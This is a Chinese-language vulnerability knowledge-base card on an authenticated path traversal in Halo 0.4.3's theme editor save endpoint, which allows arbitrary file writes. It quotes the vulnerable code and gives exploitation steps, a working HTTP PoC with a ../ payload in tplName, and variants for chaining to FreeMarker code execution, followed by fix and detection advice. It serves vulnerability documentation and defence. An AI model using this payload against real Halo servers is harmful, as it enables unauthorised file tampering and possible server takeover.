---
id: web-java-component-halo-theme-savetpl-path-traversal-write
title: Halo 0.4.3 后台主题编辑 saveTpl：tplName 无过滤导致 ../ 路径穿越任意文件写入
type: scenario
domain: web
path: web/java/component
technique: halo-theme-savetpl-path-traversal-write
tags:
- java
- halo
- spring-boot
- path-traversal
- arbitrary-file-write
- theme
- authenticated
cve: []
severity: high
confidence: medium
status: verified
affected_versions: Halo 0.4.3（原文复现版本，未给出受影响区间）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V57
  verified_at: '2026-11-05T08:50:08+08:00'
  notes: 已对照原文与图10-14核对：ThemeController.saveTpl 第295-317行 tplName 直接 append 到 templates/themes/<THEME>/ 后 new FileWriter 写入，仅校验 tplContent 非空，无 ../ 过滤；图12 tplName为空返回保存失败，图13 tplName=demo.txt&tplContent=测试案例 返回保存成功，图14 确认写入 target/classes/templates/themes/anatole/demo1.txt。原文正文称写入桌面但无图，图14仅证明主题目录内写入；越权穿越写入与 getTpl 同参数同拼接方式推得，卡内已如实标注 confidence medium，结论可保留。已将卡内指向不存在卡 [[web-java-component-halo-theme-editor-freemarker-rce]] 的关联修正为现有 [[web-generic-ssti-fastcms-template-edit-freemarker-rce]]。affected_versions 按原文仅标注复现版本 0.4.3、未给区间，未猜。PoC未在本机执行；frontmatter无sources/source_url（全库惯例）。
url: /docs/web/java/component/web-java-component-halo-theme-savetpl-path-traversal-write/
draft: false
kb_aliases:
- Halo 任意文件写入
- Halo saveTpl 路径穿越
- ThemeController 任意文件写入
- Halo 主题编辑写文件
---

## 一句话结论

Halo 0.4.3 后台主题编辑器的 `/admin/themes/editor/save` 把 `tplName` 直接拼到 `templates/themes/<主题>/` 之后并交给 `FileWriter` 写入，未过滤 `../`；拥有后台会话的攻击者可通过路径穿越把完全可控的内容写到进程有权限的任意路径。

## 原理

- `ThemeController.saveTpl()` 的核心逻辑：

  ```java
  @RequestParam("tplName") String tplName,
  @RequestParam("tplContent") String tplContent
  ...
  final File basePath = new File(ResourceUtils.getURL("classpath:").getPath());
  final StringBuilder themePath = new StringBuilder("templates/themes/");
  themePath.append(BaseController.THEME);
  themePath.append("/");
  themePath.append(tplName);
  final File tplPath = new File(basePath.getAbsolutePath(), themePath.toString());
  final FileWriter fileWriter = new FileWriter(tplPath);
  fileWriter.write(tplContent);
  ```

  `tplName` 与主题名直接字符串拼接；`new File(parent, child)` 只做路径组合，`..` 不会被移除，也没有 `getCanonicalPath()` 后校验结果仍位于主题目录。
- `FileWriter(tplPath)` 以覆盖/创建方式写入，`tplContent` 完全来自请求，因此写入内容与目标路径都由攻击者控制（目标父目录必须存在，否则 `FileWriter` 抛异常）。
- 同一控制器的 `getTpl()` 使用完全相同的拼接方式，原文已用 `../../../../.../Windows/win.ini` 读取系统文件成功，说明 `tplName` 的穿越未被任何过滤器拦截；`saveTpl` 是同一参数的写入方向。
- 与后台“主题编辑”功能的正常用途（编辑 `.ftl` 模板）相比，攻击者可以借助 `../` 跳出主题目录，覆盖配置、脚本或其他可写文件；若覆盖的是会被 FreeMarker 渲染的模板，还能进一步导致服务端代码执行。

## 触发条件

- Halo 0.4.3（原文复现版本），`/admin/themes/editor/save` 可访问。
- 攻击者持有有效后台会话（原文请求携带登录后的 `JSESSIONID`，Referer 为 `/admin/themes/editor`）。
- 目标父目录存在且 Halo 进程对其有写权限；Windows 用户目录、应用运行目录等通常满足。
- `tplContent` 非空（代码会拒绝空内容），`tplName` 可包含 `../`。

## 利用步骤

1. 登录后台，进入“外观 → 主题编辑”，任选一个模板文件，点击“确定修改”并抓取 `POST /admin/themes/editor/save` 请求。
2. 保持 `tplContent` 为要写入的内容，将 `tplName` 改为相对主题目录的穿越路径，例如 `../../../../../../Users/<user>/Desktop/demo.txt`。
3. 发送请求，响应 `{"code":1,"msg":"保存成功！"}` 表示写入动作完成（原文截图在主题目录写入 `demo.txt`/`demo1.txt` 验证了写入能力；正文称可写入桌面，穿越路径由同构的 `getTpl` 读取成功与无校验拼接推得）。
4. 读取/访问目标文件确认内容；若写入的是模板文件，访问对应页面触发 FreeMarker 渲染。

## PoC

```http
POST /admin/themes/editor/save HTTP/1.1
Host: localhost:8090
Cookie: JSESSIONID=<有效后台会话>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://localhost:8090/admin/themes/editor

tplName=../../../../../../Users/21865/Desktop/demo.txt&tplContent=written-by-halo
```

```json
{"code":1,"msg":"保存成功！","devMsg":null,"result":null}
```

```text
# 原文已验证：tplName=demo.txt&tplContent=测试案例 时
# 文件写入 classpath:templates/themes/anatole/demo1.txt，内容为请求中的 tplContent
```

## 变体与关联

- 变体：`tplName` 可用 `..\..\`（Windows）、绝对路径或 URL 编码绕过前置过滤（若存在）；写入模板文件后可结合 FreeMarker `?new Execute` 直接 RCE。
- 关联：`[[web-java-component-halo-theme-getTpl-path-traversal-read]]`（同一拼接方式的读取方向，穿越已实测）、`[[web-generic-ssti-fastcms-template-edit-freemarker-rce]]`（后台模板编辑 + FreeMarker `?new Execute` 同场景，Halo 的 FreeMarker 注入原文已实测但按同场景未单独建卡）。
- 边界：父目录不存在时 `FileWriter` 失败；应用以低权限运行只能写其可写目录；原文未给出成功写入主题目录之外的截图，正文的“桌面”说法未在图中体现，故本卡 confidence 标为 medium。

## 检测与防御

- 修复：`tplName` 仅允许白名单模板文件名（拒绝 `/`、`\`、`..`、绝对路径），或 `getCanonicalPath()` 后校验必须以主题模板目录为前缀。
- 加固：主题编辑仅对可信管理员开放并记录审计；模板变更走发布流程；应用进程最小权限运行，配置/密钥目录不可写。
- 检测：`/admin/themes/editor/save` 的 `tplName` 含 `../`、`..\\`、盘符或绝对路径；主题目录外出现由 Halo 进程写入的新文件；模板文件被非模板内容覆盖。
